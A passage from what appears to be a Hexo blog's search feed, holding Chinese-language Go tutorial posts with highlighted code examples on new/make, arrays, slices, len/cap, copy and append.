class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">}</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%v、%v、%v\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>ptr1<span class="token punctuation">,</span> <span class="token operator">*</span>ptr2<span class="token punctuation">,</span> <span class="token operator">*</span>ptr3<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Hello、2、[1 2 3]</span><span class="token punctuation">}</span></code></pre><ul><li><code>new</code>与<code>make</code><ul><li>二者均用于分配内存空间。</li><li><code>new</code>用于基本数据类型（<code>int</code>、<code>string</code>、<code>float</code>、<code>struct</code>）,函数返回对应类型的指针。</li><li><code>make</code>用于<code>slice</code>、<code>map</code>、<code>chan</code>,函数返回类型本身。</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang学习之路—容器（数组、切片、映射）</title>
      <link href="2020/10/12/Golang%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E5%AE%B9%E5%99%A8%EF%BC%88%E6%95%B0%E7%BB%84%E3%80%81%E5%88%87%E7%89%87%E3%80%81%E6%98%A0%E5%B0%84%EF%BC%89/"/>
      <url>2020/10/12/Golang%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E5%AE%B9%E5%99%A8%EF%BC%88%E6%95%B0%E7%BB%84%E3%80%81%E5%88%87%E7%89%87%E3%80%81%E6%98%A0%E5%B0%84%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="一、数组（Array）"><a href="#一、数组（Array）" class="headerlink" title="一、数组（Array）"></a>一、数组（Array）</h2><ul><li>数组是由特定类型元素组成的有序序列，Go的数组长度在声明后是固定的，不能改变<strong>，</strong></li><li>数组的长度也是数组类型的一部份，<code>[3]int</code> 与 <code>[4]int</code> 是不同的类型。</li></ul><h5 id="0x00-数组声明"><a href="#0x00-数组声明" class="headerlink" title="0x00 数组声明"></a>0x00 数组声明</h5><blockquote><p>var  arrayName  [len]T </p></blockquote><ul><li><code>len</code>为数组长度，<code>T</code>为元素类型。</li></ul><h5 id="0x01-数组初始化"><a href="#0x01-数组初始化" class="headerlink" title="0x01 数组初始化"></a>0x01 数组初始化</h5><ul><li><p>第一种</p><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> test <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token builtin">int</span>      <span class="token comment" spellcheck="true">//[0 0 0]。默认元素都被初始化为0。</span><span class="token keyword">var</span> test <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//与上面相同。</span><span class="token keyword">var</span> test <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">}</span></code></pre></li><li><p>第二种：索引赋值</p><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> test <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token builtin">int</span>test<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>test<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span></code></pre></li><li><p>第三种：自动确定长度，推荐使用。</p><pre class=" language-go"><code class="language-go">test <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">}</span>       <span class="token comment" spellcheck="true">//长度使用 … 时，会根据后面的初始化的元素个数确定长度。</span>test <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">5</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//映射赋值，下标为5的元素值为5，下标为9的元素值为1，数组长度为10。</span></code></pre></li></ul><h5 id="0x02-数组操作"><a href="#0x02-数组操作" class="headerlink" title="0x02 数组操作"></a>0x02 数组操作</h5><ul><li><p><strong>遍历数组</strong></p><pre class=" language-go"><code class="language-go">test <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">5</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token keyword">for</span> i<span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> test <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> v<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//i为下标，v为值</span><span class="token punctuation">}</span></code></pre></li><li><p><strong><code>cap()</code>与<code>len()</code></strong></p><ul><li><code>len()</code> 函数可以获取数组和切片的元素个数，即数组长度；<code>cap()</code>函数可以获取数组和切片的容量。</li><li>在数组中由于长度固定不可变，因此<code>len()</code>和<code>cap()</code>的输出永远相同。</li></ul></li><li><p><strong>数组是值类型，赋值和传参会复制整个数组。</strong></p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        arr1 <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">}</span>        arr2 <span class="token operator">:=</span> arr1        arr1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">5</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>arr1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[1 2 5 4]</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>arr2<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[1 2 3 4]</span><span class="token punctuation">}</span></code></pre></li><li><p><strong>多维数组</strong></p><pre class=" language-go"><code class="language-go">test <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//长度为4，类型为 [2]int 的二维数组</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>test<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> test<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre></li></ul><h2 id="二、切片-slice"><a href="#二、切片-slice" class="headerlink" title="二、切片(slice)"></a>二、切片(slice)</h2><ul><li><p>切片是引用类型，切片不定长。</p></li><li><p>切片（slice）本质上是对一个数组的连续片段的引用。</p></li></ul><h5 id="0x00-切片的本质"><a href="#0x00-切片的本质" class="headerlink" title="0x00 切片的本质"></a>0x00 切片的本质</h5><blockquote><p>本质上是一个对底层数组的引用，切片的结构包含：指针（底层数组首个被引用元素地址）、切片的长度、切片的容量。</p></blockquote><p><img src="/2020/10/12/Golang%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E5%AE%B9%E5%99%A8%EF%BC%88%E6%95%B0%E7%BB%84%E3%80%81%E5%88%87%E7%89%87%E3%80%81%E6%98%A0%E5%B0%84%EF%BC%89/image-20201012170533122.png" alt="image-20201012170533122"></p><h5 id="0x01-切片声明及初始化"><a href="#0x01-切片声明及初始化" class="headerlink" title="0x01 切片声明及初始化"></a>0x01 切片声明及初始化</h5><ul><li><p>第一种</p><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> s1 <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span>s1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">}</span>s2 <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">}</span></code></pre><ul><li>本质上先分别生成两个数组<code>[3]int{1,2,3}</code>、<code>[3]string{&quot;a&quot;,&quot;b&quot;,&quot;c&quot;}</code>，然后让s1、s2切片分别对其引用。</li></ul></li><li><p>第二种：直接引用数组片段。</p><pre class=" language-go"><code class="language-go">arr <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">}</span><span class="token keyword">var</span> s3 <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span>s3 <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span>     <span class="token comment" spellcheck="true">//[3 4 5 6 7]</span>s4 <span class="token operator">:=</span> arr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>   <span class="token comment" spellcheck="true">//[2 3 4]</span></code></pre></li><li><p>第三种：使用make函数构造切片。</p><ul><li><p><code>make( []T, size, cap )</code>        //T为元素的类型；size为切片的长度；cap为容量，但是不影响后续增加且可省略。</p><pre class=" language-go"><code class="language-go">a <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">//[0 0] 分配两个元素长度</span>b <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//[0 0 0] 分配两个元素长度，但内部实际分配的10个空间，只是实际用3个。</span></code></pre></li><li><p>使用make函数生成的切片一定发生了内存分配，内存分配一定会进行初始化（用对应零值），即永远不会为nil。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    s1 <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%v、%d、%d"</span><span class="token punctuation">,</span> s1<span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">cap</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[0 0 0]、3、10</span>    <span class="token keyword">var</span> s2 <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s1 <span class="token operator">==</span> <span class="token boolean">nil</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//false</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s2 <span class="token operator">==</span> <span class="token boolean">nil</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//true</span><span class="token punctuation">}</span></code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    s1 <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//[0 0 0 0 0]。make会进行内存分配，内存分配会使用零值初始化</span>    <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>        s1 <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> i<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[0 0 0 0 0 0 1 2 3 4]</span><span class="token punctuation">}</span></code></pre></li></ul></li></ul><h5 id="0x03-切片的长度（len）与容量（cap）"><a href="#0x03-切片的长度（len）与容量（cap）" class="headerlink" title="0x03 切片的长度（len）与容量（cap）"></a>0x03 切片的长度（len）与容量（cap）</h5><ul><li>切片的长度可用<code>len()</code>函数，长度即元素个数。</li><li>切片的容量用<code>cap()</code>函数,容量是切片引用的底层的数组从第一个引用元素到数组最后一个元素（注：不是引用的最后一个元素）的个数。</li></ul><p><img src="/2020/10/12/Golang%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E5%AE%B9%E5%99%A8%EF%BC%88%E6%95%B0%E7%BB%84%E3%80%81%E5%88%87%E7%89%87%E3%80%81%E6%98%A0%E5%B0%84%EF%BC%89/image-20201012173540197.png" alt="image-20201012173540197"></p><ul><li><p>代码示例</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// 代码示例1：</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    arr <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">}</span>    s3 <span class="token operator">:=</span> arr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span>   <span class="token comment" spellcheck="true">//[3 4 5 6 7]</span>    s4 <span class="token operator">:=</span> arr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">//[2 3 4]</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">cap</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//5 5</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>s4<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">cap</span><span class="token punctuation">(</span>s4<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//3 6。s4是从arr数组的第2个元素开始引用，因此容量为 [2:],共6个。</span><span class="token punctuation">}</span></code></pre></li></ul><h5 id="0x04-切片特性"><a href="#0x04-切片特性" class="headerlink" title="0x04 切片特性"></a>0x04 切片特性</h5><ul><li><p>切片是对底层数组的引用，因此底层数组值发生改变时，引用的值也会改变。</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// 代码示例1：</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    arr <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">}</span>    s3 <span class="token operator">:=</span> arr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span>     <span class="token comment" spellcheck="true">//[3 4 5 6 7]</span>    s4 <span class="token operator">:=</span> arr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">//[2 3 4]</span>    arr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3333333</span> <span class="token comment" spellcheck="true">//改变底层数组的值</span>    <span class="token comment" spellcheck="true">//切片也发生了改变</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//[3333333 4 5 6 7]</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s4<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//[2 3333333 4]</span><span class="token punctuation">}</span></code></pre></li><li><p>修改切片的值，实际上是改变底层数组的值。所以所有的引用都会发生改变。</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// 代码示例1：</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    s1 <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>    s2 <span class="token operator">:=</span> s1    s1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token comment" spellcheck="true">//实际上是改变底层数组</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[0 1 0]</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[0 1 0]</span><span class="token punctuation">}</span></code></pre><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// 代码示例2：</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    arr <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">}</span>    s3 <span class="token operator">:=</span> arr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">//[3 4 5 6 7]</span>    s4 <span class="token operator">:=</span> arr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">//[2 3 4]</span>    s4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">111</span> <span class="token comment" spellcheck="true">//本质上是改变了底层数组arr[3]的值</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[0 1 2 111 4 5 6 7]</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//[111 4 5 6 7]</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s4<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//[2 111 4]</span><span class="token punctuation">}</span></code></pre></li><li><p>切片是引用类型，所以赋值是引用。<code>copy()</code>是拷贝，拷贝了底层数组。</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// 代码示例：</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    arr <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">}</span>    s1 <span class="token operator">:=</span> arr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    s2 <span class="token operator">:=</span> s1     <span class="token comment" spellcheck="true">//赋值</span>    s3 <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>    <span class="token function">copy</span><span class="token punctuation">(</span>s3<span class="token punctuation">,</span> s1<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//copy</span>    arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1111</span> <span class="token comment" spellcheck="true">//修改原数组</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[0 1111 2 3]</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[0 1111 2 3]，切片赋值是引用，所以底层数组改变也被改变了。</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[0 1 2 3]，copy的没有因原数组改变而改变，因为copy的是底层数组。</span><span class="token punctuation">}</span></code></pre></li></ul><h5 id="0x05-切片操作"><a href="#0x05-切片操作" class="headerlink" title="0x05 切片操作"></a>0x05 切片操作</h5><ul><li><p><strong>元素追加：<code>append()</code></strong></p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">//基本操作</span>test <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token punctuation">}</span>            test <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>test<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">//后面追加一个元素</span>test <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>test<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//后面追加两个元素</span>test <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>test<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">}</span><span class="token operator">...</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//后面追加三个元素，切片会被解包，…是解包符。</span>test <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span> test<span class="token operator">...</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//前面追加一个元素</span>test <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">}</span>test <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>test<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">append</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">,</span> test<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">...</span><span class="token punctuation">)</span><span class="token operator">...</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//中间插入元素3,中间插入只能采用间接的方式。</span></code></pre><ul><li><p>当切片的容量还足够时，<code>append()</code>是修改底层数组。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    arr <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">}</span>    s1 <span class="token operator">:=</span> arr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">//[0 1 2]</span>    s1 <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[0 1 2 5]</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//[0 1 2 5 4],本质是底层数组被修改</span><span class="token punctuation">}</span></code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    arr <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token 